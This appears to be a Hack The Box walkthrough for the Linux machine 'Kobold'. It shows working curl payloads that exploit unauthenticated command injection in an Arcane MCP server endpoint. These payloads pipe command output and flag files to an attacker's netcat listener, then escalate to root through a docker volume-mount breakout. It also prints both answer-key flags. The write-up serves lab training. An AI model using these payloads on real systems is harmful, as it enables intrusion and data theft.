# Hack The Box - Kobold Walkthrough

![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Easy-green)
![Platform: Linux](https://img.shields.io/badge/Platform-Linux-blue)

## Table of Contents
- [Overview](#overview)
- [Initial Reconnaissance](#initial-reconnaissance)
- [Service Enumeration](#service-enumeration)
- [Vulnerability Discovery](#vulnerability-discovery)
- [Exploitation](#exploitation)
- [Privilege Escalation](#privilege-escalation)
- [Flags](#flags)

---

## Overview

**Machine:** Kobold  
**IP:** 10.129.7.176  
**Difficulty:** Easy  
**OS:** Linux  

### Key Points
- Unauthenticated command injection in Arcane MCP Server (CVE-2026-23520)
- Docker group membership privilege escalation
- Container breakout via volume mounting

---

## Initial Reconnaissance

### 1. Add Host to /etc/hosts

```bash
sudo echo "10.129.7.176 kobold.htb mcp.kobold.htb" >> /etc/hosts
```

### 2. Nmap Scan

```bash
nmap -sC -sV -p- --min-rate=1000 10.129.7.176
```

**Results:**

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.7
80/tcp   open  http     nginx 1.18.0 (Ubuntu)
443/tcp  open  ssl/http nginx 1.18.0 (Ubuntu)
3552/tcp open  unknown
```

---

## Service Enumeration

### 1. Web Server (Port 80/443)

Basic nginx setup - vhost discovery needed.

### 2. Arcane Service (Port 3552)

```bash
curl -s http://10.129.7.176:3552/api/openapi.json | head -100
```

**Discovered:** Arcane Docker Management v1.13.0

### 3. Subdomain Enumeration

```bash
ffuf -u http://10.129.7.176 -H "Host: FUZZ.kobold.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 0
```

**Discovered:** mcp.kobold.htb

### 4. MCP Server Analysis

```bash
curl -k -s https://mcp.kobold.htb/api/openapi.json | head -50
```

**Key Endpoint:** `/api/mcp/connect` - MCP server connection endpoint

---

## Vulnerability Discovery

### CVE-2026-23520: Arcane MCP Server Unauthenticated Command Injection

**Vulnerability:** The `/api/mcp/connect` endpoint accepts arbitrary commands without authentication via the `serverConfig.command` parameter.

**Affected Versions:** Arcane Docker Management v1.13.0

**CVSS Score:** 9.8 (Critical)

---

## Exploitation

### Step 1: Verify Command Execution

Start a listener on your attacker machine:

```bash
nc -lvnp 9001
```

Send the exploit payload:

```bash
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "id | nc 10.10.14.248 9001"],
      "env": {}
    },
    "serverId": "test"
  }'
```

**Expected Output:**
```
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```

### Step 2: Capture User Flag

```bash
# Start listener
nc -lvnp 9001

# Send payload
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "cat /home/ben/user.txt | nc 10.10.14.248 9001"],
      "env": {}
    },
    "serverId": "user"
  }'
```

**User Flag:** `10ff89dbd16ef67da5b63f58476f1c9b`

### Step 3: Check Group Membership

```bash
# Start listener
nc -lvnp 9001

# Send payload
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "id | nc 10.10.14.248 9001"],
      "env": {}
    },
    "serverId": "idcheck"
  }'
```

**Result:** `uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)`

**Note:** Docker group (GID 111) is missing! This is because command sessions don't inherit secondary groups by default.

---

## Privilege Escalation

### Step 1: Activate Docker Group

Use `sg` (switch group) command to activate the docker group membership:

```bash
# Start listener
nc -lvnp 9001

# Send payload (test docker images)
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverConfig": {
      "command": "sg",
      "args": ["docker", "-c", "docker images | nc 10.10.14.248 9001"],
      "env": {}
    },
    "serverId": "docker"
  }'
```

**Expected Output:**
```
REPOSITORY                    TAG       IMAGE ID       CREATED        SIZE
mysql                         latest    f66b7a288113   6 weeks ago    922MB
privatebin/nginx-fpm-alpine   2.0.2     f5f5564e6731   4 months ago   122MB
```

### Step 2: Container Breakout via Volume Mount

Mount the host filesystem into a container and read the root flag:

```bash
# Start listener
nc -lvnp 9001

# Send payload
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverConfig": {
      "command": "sg",
      "args": ["docker", "-c", "docker run -u root -v /:/hostfs --rm --entrypoint cat privatebin/nginx-fpm-alpine:2.0.2 /hostfs/root/root.txt | nc -w 10 10.10.14.248 9001"],
      "env": {}
    },
    "serverId": "rootflag"
  }'
```

**Breakdown of the command:**
- `sg docker -c` - Execute as docker group member
- `docker run -u root` - Run container as root user (required to read /root/root.txt)
- `-v /:/hostfs` - Mount host filesystem to /hostfs in container
- `--rm` - Remove container after execution
- `--entrypoint cat` - Use cat command instead of default entrypoint
- `privatebin/nginx-fpm-alpine:2.0.2` - Available local image
- `/hostfs/root/root.txt` - Path to root flag on mounted host filesystem

---

## Flags

### User Flag
```
10ff89dbd16ef67da5b63f58476f1c9b
```

### Root Flag
```
cfffff370705c650311f83107de22568
```

---

## Summary

### Attack Chain
1. **Reconnaissance:** Discovered Arcane MCP server on port 3552 and mcp.kobold.htb subdomain
2. **Vulnerability:** CVE-2026-23520 - Unauthenticated command injection in `/api/mcp/connect`
3. **Initial Access:** Gained command execution as user `ben`
4. **User Flag:** Read `/home/ben/user.txt`
5. **Privilege Escalation:** Used `sg docker` to activate docker group, then container breakout via volume mount
6. **Root Flag:** Mounted host filesystem and read `/root/root.txt`

### Key Lessons
- Always check for secondary group memberships with `id` and `groups`
- Use `sg` or `newgrp` to activate group memberships in command execution contexts
- Docker group membership = root access (container breakout via volume mount)
- Always enumerate all subdomains and API endpoints

### Tools Used
- nmap - port scanning
- ffuf - subdomain enumeration
- curl - API interaction and exploitation
- nc - listener for reverse connections

---

*Writeup created for educational purposes. Always practice responsible disclosure and only test systems you have explicit permission to access.*
